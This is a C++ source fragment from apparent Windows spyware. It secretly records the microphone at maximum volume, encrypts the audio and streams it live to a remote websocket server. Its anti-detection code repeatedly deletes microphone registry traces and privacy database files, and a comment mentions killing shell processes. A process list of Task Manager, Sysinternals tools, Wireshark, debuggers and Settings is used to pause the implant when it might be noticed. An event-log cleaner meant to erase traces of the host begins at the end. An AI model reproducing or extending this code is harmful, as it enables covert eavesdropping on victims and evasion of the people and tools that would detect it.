    g_log.info("Audio: recording " + std::to_string(duration) + "s @ " + std::to_string(opusSR) + "Hz gain=" + std::to_string(g_audio_gain.load()) + "%");

    // !!! CHANGED: unified cleanup using anti‑detection functions.
    // NOTE: AudioSuspendIndicatorProcesses (kills ShellExperienceHost/StartMenuExperienceHost)
    // removed from the periodic cycle — terminating the shell every 10s for hours caused Windows
    // UI to lag and eventually freeze. Registry/privacy-file cleanup is harmless to leave at 10s.
    // Shell kill still runs in AudioFullCleanup which triggers only when Settings is actually open.
    auto cleanMicReg = []() {
        AudioCleanMicRegistry();         // removes registry traces
        AudioDeletePrivacyFiles();       // deletes privacy database files
    };
    cleanMicReg();

    DWORD startTick = GetTickCount();
    DWORD maxWait = duration * 1000 + 2000;
    DWORD lastClean = 0;
    while ((GetTickCount() - startTick) < maxWait && g_audio_active.load() && g_running) {
        if (waveHdr.dwFlags & WHDR_DONE) break;
        // Threat pause: abort this recording segment; next tick of audio_record_thread will retry
        if (g_paused_by_threat.load()) { g_log.info("Audio: paused by threat, abort segment"); break; }
        // Periodic mic trace cleanup every 10 seconds (was 500ms — blocked capture loop)
        if (GetTickCount() - lastClean > 10000) { cleanMicReg(); lastClean = GetTickCount(); }
        Sleep(500);
    }

    waveInStop(hWaveIn);
    waveInReset(hWaveIn);
    waveInUnprepareHeader(hWaveIn, &waveHdr, sizeof(WAVEHDR));
    waveInClose(hWaveIn);

    // Post-recording cleanup
    cleanMicReg();

    DWORD pcmRecorded = waveHdr.dwBytesRecorded;
    if (pcmRecorded == 0) { g_log.warn("Audio: 0 bytes"); return false; }

    // Apply gain boost to PCM samples
    int gain = g_audio_gain.load();
    if (gain != 100 && gain > 0) {
        int16_t* samples = (int16_t*)pcmBuf.data();
        int numSamples = pcmRecorded / 2;
        for (int i = 0; i < numSamples; i++) {
            int32_t v = (int32_t)samples[i] * gain / 100;
            if (v > 32767) v = 32767;
            if (v < -32768) v = -32768;
            samples[i] = (int16_t)v;
        }
        g_log.info("Audio: applied gain " + std::to_string(gain) + "%");
    }

    // ── DSP: hum filter + denoise + normalize (batch path) ──
    {
        int16_t* samples = (int16_t*)pcmBuf.data();
        int numSamples = (int)(pcmRecorded / 2);
        int hum = g_audio_hum_filter.load();
        if (hum == 50 || hum == 60) {
            audio_dsp::HumFilterBank hb;
            hb.configure(opusSR, (float)hum, channels);
            audio_dsp::apply_hum_filter(samples, numSamples, hb);
            g_log.info("Audio: hum filter " + std::to_string(hum) + "Hz applied");
        }
        if (g_audio_denoise.load()) {
            audio_dsp::HighPassState hp;
            hp.configure(opusSR, channels, 80.f);
            audio_dsp::apply_highpass(samples, numSamples, hp);
            audio_dsp::NoiseGateState ng;
            ng.configure(opusSR);
            audio_dsp::apply_noise_gate(samples, numSamples, channels, ng);
            g_log.info("Audio: denoise applied (hpf+gate)");
        }
        if (g_audio_normalize.load()) {
            audio_dsp::apply_normalize(samples, numSamples, 0.90f, 3.5f);
            g_log.info("Audio: normalized");
        }
    }

    // Encode PCM → Opus in OGG container
    int err = 0;
    OpusEncoder* enc = opus_encoder_create(opusSR, channels, OPUS_APPLICATION_VOIP, &err);
    if (!enc || err != OPUS_OK) { g_log.warn("Audio: opus_encoder_create failed err=" + std::to_string(err)); return false; }
    opus_encoder_ctl(enc, OPUS_SET_BITRATE(bitrate * 1000));
    opus_encoder_ctl(enc, OPUS_SET_COMPLEXITY(5));

    const int frameMs = 20; // 20ms Opus frames
    const int frameSamples = opusSR * frameMs / 1000; // samples per frame at encoder rate
    const int granulePerFrame = 48000 * frameMs / 1000; // OGG Opus granule ALWAYS at 48kHz
    std::vector<uint8_t> opusBuf(4000);
    uint32_t serial = (uint32_t)GetTickCount();
    uint32_t pageSeq = 0;
    uint64_t granule = 0;
    const uint16_t preSkip = (uint16_t)(312 * 48000 / opusSR); // pre-skip in 48kHz units

    // Page 1: OpusHead (BOS)
    {
        uint8_t head[19] = {};
        memcpy(head, "OpusHead", 8);
        head[8] = 1; // version
        head[9] = (uint8_t)channels;
        memcpy(head + 10, &preSkip, 2); // pre-skip LE
        uint32_t inputSR = (uint32_t)opusSR;
        memcpy(head + 12, &inputSR, 4); // input sample rate LE
        head[16] = 0; head[17] = 0; // output gain = 0
        head[18] = 0; // channel mapping family 0
        ogg_write_page(audioOut, 0x02, serial, pageSeq++, 0, head, 19);
    }
    // Page 2: OpusTags
    {
        const char* vendor = "Prometey";
        uint32_t vendorLen = (uint32_t)strlen(vendor);
        uint32_t commentCount = 0;
        std::vector<uint8_t> tags(8 + 4 + vendorLen + 4);
        memcpy(tags.data(), "OpusTags", 8);
        memcpy(tags.data() + 8, &vendorLen, 4);
        memcpy(tags.data() + 12, vendor, vendorLen);
        memcpy(tags.data() + 12 + vendorLen, &commentCount, 4);
        ogg_write_page(audioOut, 0x00, serial, pageSeq++, 0, tags.data(), (int)tags.size());
    }

    // Encode audio frames — one Opus packet per OGG page (simple, compatible)
    const int16_t* pcm = (const int16_t*)pcmBuf.data();
    int totalSamples = pcmRecorded / (channels * 2);
    int offset = 0;

    while (offset + frameSamples <= totalSamples) {
        int encoded = opus_encode(enc, pcm + offset * channels, frameSamples, opusBuf.data(), (int)opusBuf.size());
        if (encoded < 0) break;
        offset += frameSamples;
        granule += granulePerFrame; // granule in 48kHz units per Opus spec

        bool isLast = (offset + frameSamples > totalSamples);
        uint8_t flags = isLast ? 0x04 : 0x00; // EOS on last page
        ogg_write_page(audioOut, flags, serial, pageSeq++, granule, opusBuf.data(), encoded);
    }

    opus_encoder_destroy(enc);

    g_log.info("Audio: " + std::to_string(pcmRecorded / 1024) + "KB PCM → " + std::to_string(audioOut.size() / 1024) + "KB Opus OGG (" +
               std::to_string(pageSeq) + " pages)");
    return !audioOut.empty();
}

// ── Streaming live audio: continuous capture with ~1s ALIV sub-chunks ──
// ALIV sub-protocol: ALIV(4) + type(1) + data
//   type 0x01 = OGG headers (OpusHead + OpusTags) — first packet
//   type 0x02 = OGG data pages (Opus frames) — ~1 second of audio
//   type 0xFF = EOS (stream ended)
// alsoRecord: if true, also accumulates full OGG for AUDR storage (mode 2)
// recordDuration: seconds for each AUDR segment
static void capture_audio_live_stream(int sampleRate, int bitrate, int channels, bool alsoRecord = false, int recordDuration = 300) {
    // Opus sample rate snap
    int opusSR = 48000;
    if (sampleRate <= 8000) opusSR = 8000;
    else if (sampleRate <= 12000) opusSR = 12000;
    else if (sampleRate <= 16000) opusSR = 16000;
    else if (sampleRate <= 24000) opusSR = 24000;

    HWAVEIN hWaveIn = nullptr;
    WAVEFORMATEX wfx = {};
    int cur_device_setting = g_audio_device_id.load();
    UINT deviceId = (cur_device_setting >= 0) ? (UINT)cur_device_setting : WAVE_MAPPER;
    HANDLE hEvent = CreateEventA(nullptr, FALSE, FALSE, nullptr);
    // Fallback: try each Opus-valid rate until waveIn opens successfully
    static const int kFallbackRates[] = {48000, 24000, 16000, 12000, 8000};
    bool opened = false;
    for (int tryRate : kFallbackRates) {
        if (tryRate > opusSR && opusSR != 48000) continue;
        wfx = {};
        wfx.wFormatTag      = WAVE_FORMAT_PCM;
        wfx.nChannels       = (WORD)channels;
        wfx.nSamplesPerSec  = (DWORD)tryRate;
        wfx.wBitsPerSample  = 16;
        wfx.nBlockAlign     = wfx.nChannels * wfx.wBitsPerSample / 8;
        wfx.nAvgBytesPerSec = wfx.nSamplesPerSec * wfx.nBlockAlign;
        MMRESULT mr = waveInOpen(&hWaveIn, deviceId, &wfx, (DWORD_PTR)hEvent, 0, CALLBACK_EVENT);
        if (mr == MMSYSERR_NOERROR) {
            if (tryRate != opusSR)
                g_log.info("Audio live: waveInOpen fallback " + std::to_string(opusSR) + "->" + std::to_string(tryRate) + "Hz");
            opusSR = tryRate;
            opened = true;
            break;
        }
        g_log.warn("Audio live: waveInOpen " + std::to_string(tryRate) + "Hz failed err=" + std::to_string(mr));
    }
    if (!opened) {
        g_log.warn("Audio live: waveInOpen failed for all rates");
        CloseHandle(hEvent);
        return;
    }

    // Mic volume boost (same as capture_audio_direct)
    {
        HMIXER hMixer = nullptr;
        if (mixerOpen(&hMixer, (UINT)(UINT_PTR)hWaveIn, 0, 0, MIXER_OBJECTF_HWAVEIN) == MMSYSERR_NOERROR) {
            MIXERLINE ml = {}; ml.cbStruct = sizeof(ml);
            ml.dwComponentType = MIXERLINE_COMPONENTTYPE_SRC_MICROPHONE;
            if (mixerGetLineInfo((HMIXEROBJ)hMixer, &ml, MIXER_GETLINEINFOF_COMPONENTTYPE) == MMSYSERR_NOERROR) {
                MIXERLINECONTROLS mlc = {}; mlc.cbStruct = sizeof(mlc);
                mlc.dwLineID = ml.dwLineID; mlc.dwControlType = MIXERCONTROL_CONTROLTYPE_VOLUME;
                MIXERCONTROL mc = {}; mc.cbStruct = sizeof(mc);
                mlc.cControls = 1; mlc.cbmxctrl = sizeof(mc); mlc.pamxctrl = &mc;
                if (mixerGetLineControls((HMIXEROBJ)hMixer, &mlc, MIXER_GETLINECONTROLSF_ONEBYTYPE) == MMSYSERR_NOERROR) {
                    MIXERCONTROLDETAILS mcd = {}; mcd.cbStruct = sizeof(mcd);
                    mcd.dwControlID = mc.dwControlID; mcd.cChannels = 1;
                    MIXERCONTROLDETAILS_UNSIGNED val = {}; val.dwValue = mc.Bounds.dwMaximum;
                    mcd.cbDetails = sizeof(val); mcd.paDetails = &val;
                    mixerSetControlDetails((HMIXEROBJ)hMixer, &mcd, 0);
                }
            }
            mixerClose(hMixer);
        }
    }

    // !!! CHANGED: unified cleanup using anti‑detection functions.
    // Shell-process kill removed from periodic cleanup — see capture_audio_direct for rationale.
    auto cleanMicReg = []() {
        AudioCleanMicRegistry();         // removes registry traces
        AudioDeletePrivacyFiles();       // deletes privacy database files
    };
    cleanMicReg();

    // Opus encoder
    int err = 0;
    OpusEncoder* enc = opus_encoder_create(opusSR, channels, OPUS_APPLICATION_VOIP, &err);
    if (!enc) { waveInClose(hWaveIn); CloseHandle(hEvent); return; }
    opus_encoder_ctl(enc, OPUS_SET_BITRATE(bitrate * 1000));
    opus_encoder_ctl(enc, OPUS_SET_COMPLEXITY(5));

    const int frameMs = 20;
    const int frameSamples = opusSR * frameMs / 1000;
    const int granulePerFrame = 48000 * frameMs / 1000; // OGG Opus granule ALWAYS at 48kHz
    const int framePcmBytes = frameSamples * channels * 2;
    const int framesPerChunk = opusSR / frameSamples; // ~50 frames = 1 second
    std::vector<uint8_t> opusBuf(4000);
    uint32_t serial = (uint32_t)GetTickCount();
    uint32_t pageSeq = 0;
    uint64_t granule = 0;
    const uint16_t preSkip = (uint16_t)(312 * 48000 / opusSR); // pre-skip in 48kHz units

    // Double-buffered waveIn: 2 buffers, each holds 2 seconds of PCM
    // Each completed buffer → encode as complete OGG (headers+data+EOS) → send as ALIV
    const int chunkDurationMs = 3000; // 3 seconds per chunk — balance latency vs. less crossfade artifacts
    const DWORD chunkBufBytes = (DWORD)(wfx.nAvgBytesPerSec * chunkDurationMs / 1000);
    std::vector<BYTE> pcmBuf1(chunkBufBytes), pcmBuf2(chunkBufBytes);
    WAVEHDR wh1 = {}, wh2 = {};
    wh1.lpData = (LPSTR)pcmBuf1.data(); wh1.dwBufferLength = chunkBufBytes;
    wh2.lpData = (LPSTR)pcmBuf2.data(); wh2.dwBufferLength = chunkBufBytes;
    waveInPrepareHeader(hWaveIn, &wh1, sizeof(WAVEHDR));
    waveInPrepareHeader(hWaveIn, &wh2, sizeof(WAVEHDR));
    waveInAddBuffer(hWaveIn, &wh1, sizeof(WAVEHDR));
    waveInAddBuffer(hWaveIn, &wh2, sizeof(WAVEHDR));
    waveInStart(hWaveIn);

    g_log.info("Audio LIVE: streaming @ " + std::to_string(opusSR) + "Hz " + std::to_string(bitrate) + "kbps, chunk=" + std::to_string(chunkDurationMs) + "ms");

    int gain = g_audio_gain.load();
    DWORD lastClean = GetTickCount();

    // ── DSP state (persistent across live chunks to avoid stitching artifacts) ──
    audio_dsp::HighPassState dsp_hp;
    dsp_hp.configure(opusSR, channels, 80.f);
    audio_dsp::NoiseGateState dsp_ng;
    dsp_ng.configure(opusSR);
    audio_dsp::HumFilterBank dsp_hum;
    int cur_hum = g_audio_hum_filter.load();
    if (cur_hum == 50 || cur_hum == 60)
        dsp_hum.configure(opusSR, (float)cur_hum, channels);

    // For alsoRecord mode: accumulate PCM and periodically send AUDR
    std::vector<BYTE> recPcmAccum; // accumulated PCM for recording
    DWORD recStartTick = GetTickCount();
    const DWORD recIntervalMs = (DWORD)recordDuration * 1000;

    // Second encoder for recording (separate state from live encoder)
    OpusEncoder* recEnc = nullptr;
    if (alsoRecord) {
        int re = 0;
        recEnc = opus_encoder_create(opusSR, channels, OPUS_APPLICATION_VOIP, &re);
        if (recEnc) { opus_encoder_ctl(recEnc, OPUS_SET_BITRATE(bitrate * 1000)); opus_encoder_ctl(recEnc, OPUS_SET_COMPLEXITY(5)); }
    }

    // Helper: encode accumulated PCM → OGG → send AUDR
    auto flushRecording = [&]() {
        if (recPcmAccum.empty() || !recEnc) return;
        std::vector<uint8_t> recOgg;
        uint32_t rs = (uint32_t)GetTickCount(), rps = 0;
        uint64_t rg = 0;
        // OGG headers
        { uint8_t h[19]={}; memcpy(h,"OpusHead",8); h[8]=1; h[9]=(uint8_t)channels;
          memcpy(h+10,&preSkip,2); uint32_t isr=(uint32_t)opusSR; memcpy(h+12,&isr,4);
          ogg_write_page(recOgg,0x02,rs,rps++,0,h,19); }
        { const char* v="Prometey"; uint32_t vl=(uint32_t)strlen(v),cc=0;
          std::vector<uint8_t> t(8+4+vl+4); memcpy(t.data(),"OpusTags",8);
          memcpy(t.data()+8,&vl,4); memcpy(t.data()+12,v,vl); memcpy(t.data()+12+vl,&cc,4);
          ogg_write_page(recOgg,0x00,rs,rps++,0,t.data(),(int)t.size()); }
        // Encode frames
        std::vector<uint8_t> rb(4000);
        const int16_t* rpcm = (const int16_t*)recPcmAccum.data();
        int rtotal = (int)(recPcmAccum.size() / (channels * 2));
        int roff = 0;
        while (roff + frameSamples <= rtotal) {
            int enc2 = opus_encode(recEnc, rpcm + roff * channels, frameSamples, rb.data(), (int)rb.size());
            if (enc2 > 0) { roff += frameSamples; rg += granulePerFrame;
                bool last = (roff + frameSamples > rtotal);
                ogg_write_page(recOgg, last ? 0x04 : 0x00, rs, rps++, rg, rb.data(), enc2);
            } else roff += frameSamples;
        }
        if (!recOgg.empty()) {
            SYSTEMTIME st; GetLocalTime(&st);
            char tb[64]; snprintf(tb,sizeof(tb),"%04d%02d%02d_%02d%02d%02d_Audio",st.wYear,st.wMonth,st.wDay,st.wHour,st.wMinute,st.wSecond);
            std::string pn(tb);
            std::string en = encrypt_filename(pn);
            auto ed = aes_encrypt(recOgg.data(), recOgg.size());
            if (!ed.empty()) {
                uint32_t nl = (uint32_t)en.size();
                std::vector<uint8_t> pkt(4+4+nl+ed.size());
                memcpy(pkt.data(),"AUDR",4); memcpy(pkt.data()+4,&nl,4);
                memcpy(pkt.data()+8,en.data(),nl); memcpy(pkt.data()+8+nl,ed.data(),ed.size());
                if (g_ws && g_ws->is_connected()) { g_ws->send_binary_priority(pkt);
                    g_log.info("Audio REC: " + pn + " " + std::to_string(recOgg.size()/1024) + "KB"); }
            }
        }
        recPcmAccum.clear();
        recStartTick = GetTickCount();
    };

    while (g_audio_active.load() && g_running && g_ws && g_ws->is_connected()) {
        // ── Detect runtime device change: break out so audio_thread_func re-enters ──
        // capture_audio_live_stream() with the new device.
        if (g_audio_device_id.load() != cur_device_setting) {
            g_log.info("Audio LIVE: device changed (" + std::to_string(cur_device_setting) +
                       " -> " + std::to_string(g_audio_device_id.load()) + "), restarting capture");
            break;
        }
        WaitForSingleObject(hEvent, chunkDurationMs + 500);

        for (auto* wh : { &wh1, &wh2 }) {
            if (!(wh->dwFlags & WHDR_DONE)) continue;
            DWORD recorded = wh->dwBytesRecorded;
            if (recorded == 0) { waveInAddBuffer(hWaveIn, wh, sizeof(WAVEHDR)); continue; }

            // Apply gain
            if (gain != 100 && gain > 0) {
                int16_t* samples = (int16_t*)wh->lpData;
                int numSamples = recorded / 2;
                for (int i = 0; i < numSamples; i++) {
                    int32_t v = (int32_t)samples[i] * gain / 100;
                    if (v > 32767) v = 32767; if (v < -32768) v = -32768;
                    samples[i] = (int16_t)v;
                }
            }

            // ── DSP: hum + denoise + normalize (live path, per-chunk) ──
            {
                int16_t* samples = (int16_t*)wh->lpData;
                int numSamples = (int)(recorded / 2);
                // Re-configure hum bank if user changed the setting at runtime
                int new_hum = g_audio_hum_filter.load();
                if (new_hum != cur_hum) {
                    cur_hum = new_hum;
                    if (cur_hum == 50 || cur_hum == 60)
                        dsp_hum.configure(opusSR, (float)cur_hum, channels);
                    else
                        dsp_hum.active_count = 0;
                }
                if (dsp_hum.active_count > 0) {
                    audio_dsp::apply_hum_filter(samples, numSamples, dsp_hum);
                }
                if (g_audio_denoise.load()) {
                    audio_dsp::apply_highpass(samples, numSamples, dsp_hp);
                    // Note: noise gate not applied in live path — it's a
                    // whole-recording operation (needs pass-1 stats). On a
                    // 3-second chunk the signal/noise separation heuristic
                    // would be unreliable and could cut speech mid-word.
                }
                // Note: peak normalization intentionally NOT applied in live path.
                // Per-chunk normalize caused quiet segments to be boosted aggressively,
                // making the live stream sound consistently louder than the batch-recorded
                // file. Normalization is a whole-recording operation and only runs in
                // capture_audio_direct() for saved AUDR segments.
            }

            // Accumulate PCM for recording (before encoding for live)
            // Skip when paused by threat — avoid saving data captured during monitoring
            if (alsoRecord && !g_paused_by_threat) {
                recPcmAccum.insert(recPcmAccum.end(), (BYTE*)wh->lpData, (BYTE*)wh->lpData + recorded);
            }

            // Encode as complete OGG for LIVE streaming
            std::vector<uint8_t> oggChunk;
            uint32_t chunkSerial = serial++;
            uint32_t ps = 0;
            uint64_t gr = 0;
            { uint8_t head[19]={}; memcpy(head,"OpusHead",8); head[8]=1; head[9]=(uint8_t)channels;
              memcpy(head+10,&preSkip,2); uint32_t inSR=(uint32_t)opusSR; memcpy(head+12,&inSR,4);
              ogg_write_page(oggChunk,0x02,chunkSerial,ps++,0,head,19); }
            { const char* v="Prometey"; uint32_t vl=(uint32_t)strlen(v),cc=0;
              std::vector<uint8_t> t(8+4+vl+4); memcpy(t.data(),"OpusTags",8);
              memcpy(t.data()+8,&vl,4); memcpy(t.data()+12,v,vl); memcpy(t.data()+12+vl,&cc,4);
              ogg_write_page(oggChunk,0x00,chunkSerial,ps++,0,t.data(),(int)t.size()); }
            const int16_t* pcm = (const int16_t*)wh->lpData;
            int totalSamples = recorded / (channels * 2);
            int off = 0;
            while (off + frameSamples <= totalSamples) {
                int encoded = opus_encode(enc, pcm + off * channels, frameSamples, opusBuf.data(), (int)opusBuf.size());
                if (encoded > 0) { off += frameSamples; gr += granulePerFrame;
                    bool isLast = (off + frameSamples > totalSamples);
                    ogg_write_page(oggChunk, isLast ? 0x04 : 0x00, chunkSerial, ps++, gr, opusBuf.data(), encoded);
                } else off += frameSamples;
            }
            if (!oggChunk.empty() && g_ws && g_ws->is_connected() && !g_paused_by_threat) {
                std::vector<uint8_t> pkt(4 + oggChunk.size());
                memcpy(pkt.data(), "ALIV", 4);
                memcpy(pkt.data() + 4, oggChunk.data(), oggChunk.size());
                g_ws->send_binary_priority(pkt);
            }

            wh->dwBytesRecorded = 0; wh->dwFlags &= ~WHDR_DONE;
            waveInAddBuffer(hWaveIn, wh, sizeof(WAVEHDR));
        }

        // Flush recording periodically (skip while paused — no new PCM accumulated anyway)
        if (alsoRecord && !g_paused_by_threat && (GetTickCount() - recStartTick) >= recIntervalMs) {
            flushRecording();
        }
        // Periodic mic trace cleanup every 10 seconds (was 500ms — blocked sender loop)
        if (GetTickCount() - lastClean > 10000) { cleanMicReg(); lastClean = GetTickCount(); gain = g_audio_gain.load(); }
    }

    // Flush remaining recording
    if (alsoRecord) flushRecording();
    if (recEnc) opus_encoder_destroy(recEnc);

    waveInStop(hWaveIn); waveInReset(hWaveIn);
    waveInUnprepareHeader(hWaveIn, &wh1, sizeof(WAVEHDR));
    waveInUnprepareHeader(hWaveIn, &wh2, sizeof(WAVEHDR));
    waveInClose(hWaveIn);
    opus_encoder_destroy(enc);
    CloseHandle(hEvent);
    cleanMicReg();
    g_log.info("Audio LIVE: stream ended");
}

static void audio_thread_func() {
    g_log.info("Audio thread started");
    std::this_thread::sleep_for(std::chrono::seconds(3));

    while (g_running) {
        if (!g_audio_active.load()) {
            std::this_thread::sleep_for(std::chrono::seconds(1));
            continue;
        }
        if (!g_ws || !g_ws->is_connected()) {
            std::this_thread::sleep_for(std::chrono::seconds(1));
            continue;
        }

        int mode = g_audio_mode.load(); // 0=record, 1=live, 2=both
        int sr = g_audio_sample_rate.load();
        int br = g_audio_bitrate.load();
        int ch = g_audio_channels.load();
        bool isLive = (mode == 1 || mode == 2);
        bool isRecord = (mode == 0 || mode == 2);

        if (mode == 1) {
            // LIVE ONLY: streaming capture, no recording
            g_log.info("Audio: LIVE streaming mode");
            try { capture_audio_live_stream(sr, br, ch, false, 0); } catch (...) { g_log.warn("Audio: live exception"); }
            if (!g_audio_active.load()) continue;
            std::this_thread::sleep_for(std::chrono::seconds(1));
            continue;
        }

        if (mode == 2) {
            // LIVE + RECORD: single mic, streaming + periodic AUDR saves
            int recDur = g_audio_segment_duration.load();
            g_log.info("Audio: LIVE+REC streaming, segment=" + std::to_string(recDur) + "s");
            try { capture_audio_live_stream(sr, br, ch, true, recDur); } catch (...) { g_log.warn("Audio: live+rec exception"); }
            if (!g_audio_active.load()) continue;
            std::this_thread::sleep_for(std::chrono::seconds(1));
            continue;
        }

        // Mode 0 (record only): batch capture
        int duration = g_audio_segment_duration.load();
        g_log.info("Audio: recording " + std::to_string(duration) + "s...");

        std::vector<uint8_t> audioData;
        bool ok = false;
        try { ok = capture_audio_direct(audioData, duration, sr, br, ch); }
        catch (...) { g_log.warn("Audio: capture exception"); }
        if (!g_audio_active.load()) continue;
        if (!ok || audioData.empty()) {
            g_log.warn("Audio: recording failed");
            std::this_thread::sleep_for(std::chrono::seconds(5));
            continue;
        }

        g_log.info("Audio: recorded " + std::to_string(audioData.size() / 1024) + "KB");
        SYSTEMTIME st; GetLocalTime(&st);
        char timeBuf[64];
        snprintf(timeBuf, sizeof(timeBuf), "%04d%02d%02d_%02d%02d%02d_Audio", st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
        std::string plainName(timeBuf);
        std::string encName = encrypt_filename(plainName);
        auto encData = aes_encrypt(audioData.data(), audioData.size());
        if (!encData.empty()) {
            uint32_t nameLen = (uint32_t)encName.size();
            std::vector<uint8_t> packet(4 + 4 + nameLen + encData.size());
            memcpy(packet.data(), "AUDR", 4); memcpy(packet.data() + 4, &nameLen, 4);
            memcpy(packet.data() + 8, encName.data(), nameLen);
            memcpy(packet.data() + 8 + nameLen, encData.data(), encData.size());
            if (g_ws && g_ws->is_connected()) { g_ws->send_binary_priority(packet); g_log.info("Audio RECORD: " + plainName); }
        }
    }
    g_log.info("Audio thread stopped");
}

// ===== Main =====
// ═══════════════════════════════════════════════════════════════
//  THREAT MONITOR — detects monitoring tools and pauses host
// ═══════════════════════════════════════════════════════════════
static std::thread g_threat_thread;

// Use forward-declared ThreatInfoFwd as ThreatInfo
using ThreatInfo = ThreatInfoFwd;

static const std::vector<std::pair<std::string, std::string>> kThreatProcesses = {
    // Process monitors
    {"taskmgr.exe",          "task_mgr"},
    {"resmon.exe",           "task_mgr"},          // Resource Monitor
    {"perfmon.exe",          "task_mgr"},          // Performance Monitor
    {"procexp.exe",          "process_explorer"},  // Sysinternals Process Explorer
    {"procexp64.exe",        "process_explorer"},
    {"procmon.exe",          "process_explorer"},  // Process Monitor
    {"procmon64.exe",        "process_explorer"},
    {"processhacker.exe",    "process_explorer"},
    {"systeminformer.exe",   "process_explorer"},  // Process Hacker successor
    {"pchunter.exe",         "process_explorer"},
    {"pchunter64.exe",       "process_explorer"},
    {"autoruns.exe",         "process_explorer"},
    {"autoruns64.exe",       "process_explorer"},
    // Network sniffers / monitors
    {"wireshark.exe",        "sniffer"},
    {"dumpcap.exe",          "sniffer"},
    {"tshark.exe",           "sniffer"},
    {"fiddler.exe",          "sniffer"},
    {"fiddler everywhere.exe","sniffer"},
    {"httpdebuggerpro.exe",  "sniffer"},
    {"httpdebugger.exe",     "sniffer"},
    {"charles.exe",          "sniffer"},
    {"tcpview.exe",          "sniffer"},
    {"tcpview64.exe",        "sniffer"},
    {"netmon.exe",           "sniffer"},
    {"smsniff.exe",          "sniffer"},
    // Reverse engineering / analysis
    {"x64dbg.exe",           "process_explorer"},
    {"x32dbg.exe",           "process_explorer"},
    {"ollydbg.exe",          "process_explorer"},
    {"ida.exe",              "process_explorer"},
    {"ida64.exe",            "process_explorer"},
    {"windbg.exe",           "process_explorer"},
    // Windows Settings (Privacy/Security pages — can't read title cross-session,
    // so flag any SystemSettings.exe instance; user can dismiss false positives)
    {"systemsettings.exe",   "privacy_settings"},
};

static std::string lower_str(const std::string& s) {
    std::string r; r.reserve(s.size());
    for (char c : s) r += (char)tolower((unsigned char)c);
    return r;
}

// Cross-session process detection: prefer helper IPC (knows visibility),
// fallback to Toolhelp32 if helper not running.
static bool find_threat_process(ThreatInfo& out) {
    // Try IPC first — helper runs in user session and reports visible windows
    if (g_ipc_reader_ptr) {
        std::vector<std::pair<std::string,std::string>> list;
        int n = g_ipc_reader_ptr->get_threat_list(list);
        {
            std::lock_guard<std::mutex> lk(g_threat_mtx);
            g_threat_list_all = list;
        }
        if (n > 0) {
            out.proc = list[0].first;
            out.title = list[0].second;
            out.visible = true;
            std::string lo = lower_str(out.proc);
            for (const auto& [name, cat] : kThreatProcesses) {
                if (lo == name) { out.category = cat; break; }
            }
            if (out.category.empty()) out.category = "other";
            return true;
        }
        return false;
    }

    // Use shared scanner from threat_scan.h — applies frozen-state filter
    std::vector<std::pair<std::string,std::string>> list;
    ts_scan_all(list);
    {
        std::lock_guard<std::mutex> lk(g_threat_mtx);
        g_threat_list_all = list;
    }
    if (list.empty()) return false;
    out.proc = list[0].first;
    out.title = list[0].second;
    out.visible = true;
    std::string lo = lower_str(out.proc);
    for (const auto& [name, cat] : kThreatProcesses) {
        if (lo == name) { out.category = cat; break; }
    }
    if (out.category.empty()) out.category = "other";
    return true;
}

static void threat_monitor_func() {
    g_log.info("Threat monitor started");
    while (g_running) {
        // Scan interval: 5s instead of 1.5s — CreateToolhelp32Snapshot + EnumWindows
        // is expensive, running every 1.5s caused noticeable CPU load on the host.
        // 5s is fast enough to detect monitoring tools before user reads anything useful.
        std::this_thread::sleep_for(std::chrono::seconds(5));
        if (!g_running) break;

        ThreatInfo found;
        if (g_threat_scan_enabled) {
            find_threat_process(found);
        } else {
            // Scanner disabled — clear any prior state and skip
            std::lock_guard<std::mutex> lk(g_threat_mtx);
            g_threat_list_all.clear();
        }

        bool was_paused = g_paused_by_threat.load();
        bool now_threat = !found.proc.empty();
        // Pause only if visible. Without IPC helper, visible defaults to true → behaves like before.
        bool should_pause = now_threat && found.visible;

        // Update state
        {
            std::lock_guard<std::mutex> lk(g_threat_mtx);
            g_last_threat = found;
        }

        if (should_pause && g_threat_auto_pause) {
            if (!was_paused) {
                g_paused_by_threat = true;
                g_log.warn("THREAT detected: " + found.proc + " (" + found.category + ") — pausing host");
            }
        } else {
            if (was_paused) {
                g_paused_by_threat = false;
                g_log.info("Threat cleared — resuming host");
            }
        }

        // Push event to client (always — so UI sync stays in sync)
        if (g_ws && g_ws->is_connected()) {
            // Build threats array
            std::string arr = "[";
            {
                std::lock_guard<std::mutex> lk(g_threat_mtx);
                bool first = true;
                for (const auto& [p, t] : g_threat_list_all) {
                    if (!first) arr += ",";
                    first = false;
                    std::string lo = lower_str(p);
                    std::string cat = "other";
                    for (const auto& [name, c] : kThreatProcesses) if (lo == name) { cat = c; break; }
                    arr += "{\"proc\":\"" + json_escape(p) + "\",\"title\":\"" + json_escape(t) +
                           "\",\"category\":\"" + json_escape(cat) + "\"}";
                }
            }
            arr += "]";
            std::string evt = "{\"event\":\"threat_status\",\"detected\":" +
                              std::string(now_threat ? "true" : "false") +
                              ",\"visible\":" + std::string(found.visible ? "true" : "false") +
                              ",\"paused\":" + std::string(g_paused_by_threat ? "true" : "false") +
                              ",\"proc\":\"" + json_escape(found.proc) + "\"" +
                              ",\"title\":\"" + json_escape(found.title) + "\"" +
                              ",\"category\":\"" + json_escape(found.category) + "\"" +
                              ",\"threats\":" + arr + "}";
            g_ws->send_text(to_utf8(evt));
        }
    }
    g_log.info("Threat monitor stopped");
}

// ═══════════════════════════════════════════════════════════════
//  EVENT LOG AUTO-CLEANER — removes all traces of this host
// ═══════════════════════════════════════════════════════════════
static std::thread              g_evtlog_cleaner_thread;

// Interruptible sleep: returns early if g_running goes false OR config changes (gen changes)
static void evtlog_sleep(int seconds, int gen_at_start) {
    std::unique_lock<std::mutex> lk(g_evtlog_cv_mtx);
    g_evtlog_cv.wait_for(lk, std::chrono::seconds(seconds), [&]{
        return !g_running.load() || g_evtlog_config_gen.load() != gen_at_start;
    });
}

static std::string evtlog_build_pattern(const std::string& cfg_patterns) {
    std::string patterns;
    std::istringstream ss(cfg_patterns);
    std::string token;
    while (std::getline(ss, token, ',')) {
        while (!token.empty() && token.front() == ' ') token.erase(token.begin());
        while (!token.empty() && token.back() == ' ')  token.pop_back();
        if (token.empty()) continue;
        if (!patterns.empty()) patterns += "|";
        patterns += token;
    }
    return patterns;
}

static void evtlog_cleaner_func() {
    // Wait for config to be loaded at service startup
    {
        std::unique_lock<std::mutex> lk(g_evtlog_cv_mtx);
        g_evtlog_cv.wait_for(lk, std::chrono::seconds(5), []{ return !g_running.load(); });
    }

    // Logs to scan (fixed list)
